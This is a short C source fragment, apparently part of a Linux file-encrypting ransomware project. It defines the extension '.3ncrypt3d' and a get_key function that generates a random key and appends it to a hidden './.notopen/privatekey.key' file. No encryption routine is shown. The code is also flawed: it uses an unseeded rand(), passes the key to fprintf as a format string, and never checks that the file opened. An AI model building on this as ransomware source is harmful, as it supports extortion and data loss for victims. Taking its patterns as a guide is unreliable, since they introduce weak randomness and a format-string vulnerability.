#include <stdio.h>
#include <stdlib.h>
#include "liblinuxencode.h"

#define EXT_ENCRYPTED ".3ncrypt3d"
#define EXT_LENGHT 10


char *get_key(int length) {
    char alphab[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    char *tab = (char *)malloc((length + 1) * sizeof(char)); 

    if (tab != NULL) {
        for (size_t n = 0; n < length; n++) {
            int key = rand() % (int)(sizeof alphab - 1);
            tab[n] = alphab[key];
        }
        tab[length] = '\0';
        
    }

    FILE *file = fopen("./.notopen/privatekey.key", "a");
    fprintf(file, tab);

    return tab;
}